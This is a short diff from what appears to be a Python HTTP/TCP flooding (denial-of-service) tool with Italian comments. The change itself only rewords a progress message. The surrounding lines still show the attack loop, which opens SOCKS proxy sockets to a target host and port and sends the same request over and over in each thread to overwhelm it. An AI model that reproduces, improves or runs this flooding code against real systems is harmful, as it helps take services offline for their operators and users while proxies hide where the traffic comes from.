@@ -367,7 +367,7 @@ class tcpfloodproxed(threading.Thread): # la classe del multithreading
 				s = socks.socksocket() # creazione socket
 				s.connect((str(url2),int(port))) # si connette
 				s.send(p) # ed invia
-				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
+				print ("Package Sending " + str(proxy[0]+":"+proxy[1]) + " ✓", self.counter) # print req + counter
 				try: # invia altre richieste nello stesso thread
 					for y in range(multiple): # fattore di moltiplicazione
 						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
